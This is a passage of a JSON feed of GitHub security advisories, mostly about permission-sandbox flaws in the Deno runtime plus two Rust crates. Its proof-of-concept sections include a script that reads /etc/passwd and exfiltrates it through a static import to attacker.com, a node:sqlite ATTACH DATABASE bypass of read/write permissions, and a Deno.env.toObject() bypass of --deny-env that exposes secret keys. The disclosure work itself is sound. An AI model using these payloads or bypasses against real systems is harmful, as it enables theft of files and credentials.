            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Static imports are exempted from the network permission check. An attacker could exploit this to leak the password file on the network.</p>\n<h3 id=\"details\">Details</h3>\n<p>Static imports in Deno are exempted from the network permission check. This can be exploited by attackers in multiple ways, when third-party code is directly/indirectly executed with <code>deno run</code>:</p>\n<ol>\n<li>The simplest payload would be a tracking pixel-like import that attackers place in their code to find out when developers use the attacker-controlled code.</li>\n<li>When <code>--allow-write</code> and <code>--allow-read</code> permissions are given, an attacker can perform a sophisticated two-steps attack: first, they generate a ts/js file containing a static import and in a second execution load this static file.</li>\n</ol>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-ts\">const __filename = new URL(\"\", import.meta.url).pathname;\nlet oldContent = await Deno.readTextFile(__filename);\nlet passFile = await Deno.readTextFile(\"/etc/passwd\");\nlet pre =\n  'import {foo} from \"[https://attacker.com?val=](https://attacker.com/?val=)' +\n  encodeURIComponent(passFile) + '\";\\n';\nawait Deno.writeTextFile(__filename, pre + oldContent);\n</code></pre>\n<p>Executing a file containing this payload twice, with <code>deno run --allow-read --allow-write</code> would cause the password file to leak on the network, even though no network permission was granted.</p>\n<p>This vulnerability was fixed with the addition of the <code>--allow-import</code> flag: <a href=\"https://docs.deno.com/runtime/fundamentals/security/#network-access\">https://docs.deno.com/runtime/fundamentals/security/#network-access</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-jv4x-jv3h-qff5\">https://github.com/denoland/deno/security/advisories/GHSA-jv4x-jv3h-qff5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jv4x-jv3h-qff5\">https://github.com/advisories/GHSA-jv4x-jv3h-qff5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jv4x-jv3h-qff5",
            "title": "[deno] Deno vulnerable to Exposure of Sensitive Information to an Unauthorized Actor",
            "date_modified": "2025-06-05T01:21:08.000Z",
            "date_published": "2025-06-05T01:21:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jv4x-jv3h-qff5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Affected versions append <code>root</code> to group listings, unless the correct listing has exactly 1024 groups.</p>\n<p>This affects both:</p>\n<ul>\n<li>The supplementary groups of a user</li>\n<li>The group access list of the current process</li>\n</ul>\n<p>If the caller uses this information for access control, this may lead to privilege escalation.</p>\n<p>This crate is not currently maintained, so a patched version is not available.</p>\n<p>Versions older than 0.8.0 do not contain the affected functions, so downgrading to them is a workaround.</p>\n<h2 id=\"recommended-alternatives\">Recommended alternatives</h2>\n<ul>\n<li><a href=\"https://crates.io/crates/uzers\"><code>uzers</code></a> (an actively maintained fork of the <code>users</code> crate)</li>\n<li><a href=\"https://crates.io/crates/sysinfo\"><code>sysinfo</code></a></li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ogham/rust-users/issues/44\">https://github.com/ogham/rust-users/issues/44</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2025-0040.html\">https://rustsec.org/advisories/RUSTSEC-2025-0040.html</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-5791\">https://nvd.nist.gov/vuln/detail/CVE-2025-5791</a></li>\n<li><a href=\"https://access.redhat.com/security/cve/CVE-2025-5791\">https://access.redhat.com/security/cve/CVE-2025-5791</a></li>\n<li><a href=\"https://bugzilla.redhat.com/show_bug.cgi?id=2370001\">https://bugzilla.redhat.com/show_bug.cgi?id=2370001</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-m65q-v92h-cm7q\">https://github.com/advisories/GHSA-m65q-v92h-cm7q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-m65q-v92h-cm7q",
            "title": "[users] users may append `root` to group listings",
            "date_modified": "2025-06-06T23:16:39.000Z",
            "date_published": "2025-06-05T01:17:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-m65q-v92h-cm7q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>The following functions in the anon-vec crate are unsound due to insufficient checks on their arguments::</p>\n<ul>\n<li><code>AnonVec::get_ref()</code></li>\n<li><code>AnonVec::get_mut()</code></li>\n<li><code>AnonVec::remove_get()</code></li>\n</ul>\n<p>The crate was built as a learning project and is not being maintained.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/RylanYancey/anon-vec\">https://github.com/RylanYancey/anon-vec</a></li>\n<li><a href=\"https://rustsec.org/advisories/RUSTSEC-2025-0039.html\">https://rustsec.org/advisories/RUSTSEC-2025-0039.html</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-pr59-jjr4-gcf6\">https://github.com/advisories/GHSA-pr59-jjr4-gcf6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-pr59-jjr4-gcf6",
            "title": "[anon-vec] anon-vec lacks sufficient checks in public API",
            "date_modified": "2025-06-05T00:39:57.000Z",
            "date_published": "2025-06-05T00:39:55.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-pr59-jjr4-gcf6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>It is possible to bypass Deno's read/write permission checks by using <code>ATTACH DATABASE</code> statement.</p>\n<h2 id=\"poc\">PoC</h2>\n<pre><code class=\"language-js\">// poc.js\nimport { DatabaseSync } from \"node:sqlite\"\n\nconst db = new DatabaseSync(\":memory:\");\ndb.exec(\"ATTACH DATABASE 'test.db' as test;\");\n\ndb.exec(\"CREATE TABLE test.test (id INTEGER PRIMARY KEY, name TEXT);\");\n</code></pre>\n<pre><code>$ deno poc.js\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596\">https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860\">https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48935\">https://nvd.nist.gov/vuln/detail/CVE-2025-48935</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8vxj-4cph-c596\">https://github.com/advisories/GHSA-8vxj-4cph-c596</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8vxj-4cph-c596",
            "title": "[deno_node] Deno has --allow-read / --allow-write permission bypass in `node:sqlite`",
            "date_modified": "2025-06-04T22:57:14.000Z",
            "date_published": "2025-06-04T21:22:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8vxj-4cph-c596"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>It is possible to bypass Deno's read/write permission checks by using <code>ATTACH DATABASE</code> statement.</p>\n<h2 id=\"poc\">PoC</h2>\n<pre><code class=\"language-js\">// poc.js\nimport { DatabaseSync } from \"node:sqlite\"\n\nconst db = new DatabaseSync(\":memory:\");\ndb.exec(\"ATTACH DATABASE 'test.db' as test;\");\n\ndb.exec(\"CREATE TABLE test.test (id INTEGER PRIMARY KEY, name TEXT);\");\n</code></pre>\n<pre><code>$ deno poc.js\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596\">https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860\">https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48935\">https://nvd.nist.gov/vuln/detail/CVE-2025-48935</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8vxj-4cph-c596\">https://github.com/advisories/GHSA-8vxj-4cph-c596</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8vxj-4cph-c596",
            "title": "[deno] Deno has --allow-read / --allow-write permission bypass in `node:sqlite`",
            "date_modified": "2025-06-04T22:57:14.000Z",
            "date_published": "2025-06-04T21:22:27.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8vxj-4cph-c596"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://docs.deno.com/api/deno/~/Deno.Env.toObject\">Deno.env.toObject</a> method ignores any variables listed in the <code>--deny-env</code> option of the <code>deno run</code> command. When looking at the <a href=\"https://docs.deno.com/runtime/fundamentals/security/#environment-variables\">documentation</a> of the <code>--deny-env</code> option this might lead to a false impression that variables listed in the option are impossible to read.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>export AWS_SECRET_ACCESS_KEY=my-secret-aws-key\n\n# Works as expected. The program stops with a \"NotCapable\" error message\necho 'console.log(Deno.env.get(\"AWS_SECRET_ACCESS_KEY\"));' | deno run \\\n  --allow-env \\\n  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -\n\n# All enviroment variables are printed and the --deny-env list is completely disregarded\necho 'console.log(Deno.env.toObject());' | deno run \\\n  --allow-env \\\n  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -\n</code></pre>\n<p>The first example using <code>get</code> exits with the following error:</p>\n<pre><code>error: Uncaught (in promise) NotCapable: Requires env access to \"AWS_SECRET_ACCESS_KEY\", run again with the --allow-env flag\nconsole.log(Deno.env.get(\"AWS_SECRET_ACCESS_KEY\"));\n                     ^\n    at Object.getEnv [as get] (ext:deno_os/30_os.js:124:10)\n    at file:///$deno$stdin.mts:1:22\n</code></pre>\n<p>The second example  using <code>toObject</code> prints all environment variables:</p>\n<pre><code>[Object: null prototype] {\n  ...\n  AWS_SECRET_ACCESS_KEY: \"my-secret-aws-key\",\n  ...\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Software relying on the combination of both flags to allow access to most environment variables except a few sensitive ones will be vulnerable to malicious code trying to steal secrets using the Deno.env.toObject() method.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789\">https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789</a></li>\n<li><a href=\"https://github.com/denoland/deno/pull/29079\">https://github.com/denoland/deno/pull/29079</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f\">https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753\">https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753</a></li>\n<li><a href=\"https://docs.deno.com/api/deno/~/Deno.Env.toObject\">https://docs.deno.com/api/deno/~/Deno.Env.toObject</a></li>\n<li><a href=\"https://docs.deno.com/runtime/fundamentals/security/#environment-variables\">https://docs.deno.com/runtime/fundamentals/security/#environment-variables</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48934\">https://nvd.nist.gov/vuln/detail/CVE-2025-48934</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7w8p-chxq-2789\">https://github.com/advisories/GHSA-7w8p-chxq-2789</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7w8p-chxq-2789",
            "title": "[deno_runtime] Deno.env.toObject() ignores the variables listed in --deny-env and returns all environment variables",
            "date_modified": "2025-06-04T22:57:04.000Z",
            "date_published": "2025-06-04T21:18:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7w8p-chxq-2789"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://docs.deno.com/api/deno/~/Deno.Env.toObject\">Deno.env.toObject</a> method ignores any variables listed in the <code>--deny-env</code> option of the <code>deno run</code> command. When looking at the <a href=\"https://docs.deno.com/runtime/fundamentals/security/#environment-variables\">documentation</a> of the <code>--deny-env</code> option this might lead to a false impression that variables listed in the option are impossible to read.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>export AWS_SECRET_ACCESS_KEY=my-secret-aws-key\n\n# Works as expected. The program stops with a \"NotCapable\" error message\necho 'console.log(Deno.env.get(\"AWS_SECRET_ACCESS_KEY\"));' | deno run \\\n  --allow-env \\\n  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -\n\n# All enviroment variables are printed and the --deny-env list is completely disregarded\necho 'console.log(Deno.env.toObject());' | deno run \\\n  --allow-env \\\n  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -\n</code></pre>\n<p>The first example using <code>get</code> exits with the following error:</p>\n<pre><code>error: Uncaught (in promise) NotCapable: Requires env access to \"AWS_SECRET_ACCESS_KEY\", run again with the --allow-env flag\nconsole.log(Deno.env.get(\"AWS_SECRET_ACCESS_KEY\"));\n                     ^\n    at Object.getEnv [as get] (ext:deno_os/30_os.js:124:10)\n    at file:///$deno$stdin.mts:1:22\n</code></pre>\n<p>The second example  using <code>toObject</code> prints all environment variables:</p>\n<pre><code>[Object: null prototype] {\n  ...\n  AWS_SECRET_ACCESS_KEY: \"my-secret-aws-key\",\n  ...\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Software relying on the combination of both flags to allow access to most environment variables except a few sensitive ones will be vulnerable to malicious code trying to steal secrets using the Deno.env.toObject() method.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789\">https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789</a></li>\n<li><a href=\"https://github.com/denoland/deno/pull/29079\">https://github.com/denoland/deno/pull/29079</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f\">https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753\">https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753</a></li>\n<li><a href=\"https://docs.deno.com/api/deno/~/Deno.Env.toObject\">https://docs.deno.com/api/deno/~/Deno.Env.toObject</a></li>\n<li><a href=\"https://docs.deno.com/runtime/fundamentals/security/#environment-variables\">https://docs.deno.com/runtime/fundamentals/security/#environment-variables</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48934\">https://nvd.nist.gov/vuln/detail/CVE-2025-48934</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7w8p-chxq-2789\">https://github.com/advisories/GHSA-7w8p-chxq-2789</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7w8p-chxq-2789",
            "title": "[deno] Deno.env.toObject() ignores the variables listed in --deny-env and returns all environment variables",
            "date_modified": "2025-06-04T22:57:04.000Z",
            "date_published": "2025-06-04T21:18:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7w8p-chxq-2789"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://docs.deno.com/api/deno/~/Deno.Env.toObject\">Deno.env.toObject</a> method ignores any variables listed in the <code>--deny-env</code> option of the <code>deno run</code> command. When looking at the <a href=\"https://docs.deno.com/runtime/fundamentals/security/#environment-variables\">documentation</a> of the <code>--deny-env</code> option this might lead to a false impression that variables listed in the option are impossible to read.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code>export AWS_SECRET_ACCESS_KEY=my-secret-aws-key\n\n# Works as expected. The program stops with a \"NotCapable\" error message\necho 'console.log(Deno.env.get(\"AWS_SECRET_ACCESS_KEY\"));' | deno run \\\n  --allow-env \\\n  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -\n\n# All enviroment variables are printed and the --deny-env list is completely disregarded\necho 'console.log(Deno.env.toObject());' | deno run \\\n  --allow-env \\\n  --deny-env=AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY -\n</code></pre>\n<p>The first example using <code>get</code> exits with the following error:</p>\n<pre><code>error: Uncaught (in promise) NotCapable: Requires env access to \"AWS_SECRET_ACCESS_KEY\", run again with the --allow-env flag\nconsole.log(Deno.env.get(\"AWS_SECRET_ACCESS_KEY\"));\n                     ^\n    at Object.getEnv [as get] (ext:deno_os/30_os.js:124:10)\n    at file:///$deno$stdin.mts:1:22\n</code></pre>\n<p>The second example  using <code>toObject</code> prints all environment variables:</p>\n<pre><code>[Object: null prototype] {\n  ...\n  AWS_SECRET_ACCESS_KEY: \"my-secret-aws-key\",\n  ...\n}\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Software relying on the combination of both flags to allow access to most environment variables except a few sensitive ones will be vulnerable to malicious code trying to steal secrets using the Deno.env.toObject() method.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789\">https://github.com/denoland/deno/security/advisories/GHSA-7w8p-chxq-2789</a></li>\n<li><a href=\"https://github.com/denoland/deno/pull/29079\">https://github.com/denoland/deno/pull/29079</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f\">https://github.com/denoland/deno/commit/2959e083912420988066a001c2b2d6732a1b562f</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753\">https://github.com/denoland/deno/commit/946ccda1aa19a00c478a5e6826b75053b050d753</a></li>\n<li><a href=\"https://docs.deno.com/api/deno/~/Deno.Env.toObject\">https://docs.deno.com/api/deno/~/Deno.Env.toObject</a></li>\n<li><a href=\"https://docs.deno.com/runtime/fundamentals/security/#environment-variables\">https://docs.deno.com/runtime/fundamentals/security/#environment-variables</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48934\">https://nvd.nist.gov/vuln/detail/CVE-2025-48934</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7w8p-chxq-2789\">https://github.com/advisories/GHSA-7w8p-chxq-2789</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7w8p-chxq-2789",
            "title": "[deno] Deno.env.toObject() ignores the variables listed in --deny-env and returns all environment variables",
            "date_modified": "2025-06-04T22:57:04.000Z",
            "date_published": "2025-06-04T21:18:18.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7w8p-chxq-2789"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>deno run --allow-read --deny-read main.ts</code> results in allowed, even though 'deny' should be stronger. Same with all global unary permissions given as <code>--allow-* --deny-*</code>.</p>\n<h3 id=\"details\">Details</h3>\n<p>Caused by the fast exit logic in #22894.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>Run the above command expecting no permissions to be passed.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>This only affects a nonsensical combination of flags, so there shouldn't be a real impact on the userbase.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683\">https://github.com/denoland/deno/security/advisories/GHSA-xqxc-x6p3-w683</a></li>\n<li><a href=\"https://github.com/denoland/deno/pull/22894\">https://github.com/denoland/deno/pull/22894</a></li>\n<li><a href=\"https://github.com/denoland/deno/pull/29213\">https://github.com/denoland/deno/pull/29213</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db\">https://github.com/denoland/deno/commit/2f0fae9d9071dcaf0a689bc7097584b1b9ebc8db</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f\">https://github.com/denoland/deno/commit/9d665572d3cd39f997e29e6daac7c1102fc5c04f</a></li>\n<li><a href=\"https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf\">https://github.com/denoland/deno/commit/ef315b56c26c9ef5f25284a5100d2ed525a148cf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-48888\">https://nvd.nist.gov/vuln/detail/CVE-2025-48888</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-xqxc-x6p3-w683\">https://github.com/advisories/GHSA-xqxc-x6p3-w683</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-xqxc-x6p3-w683",
            "title": "[deno_runtime] Deno run with --allow-read and --deny-read flags results in allowed",
            "date_modified": "2025-06-04T22:56:55.000Z",
            "date_published": "2025-06-04T21:13:44.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-xqxc-x6p3-w683"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}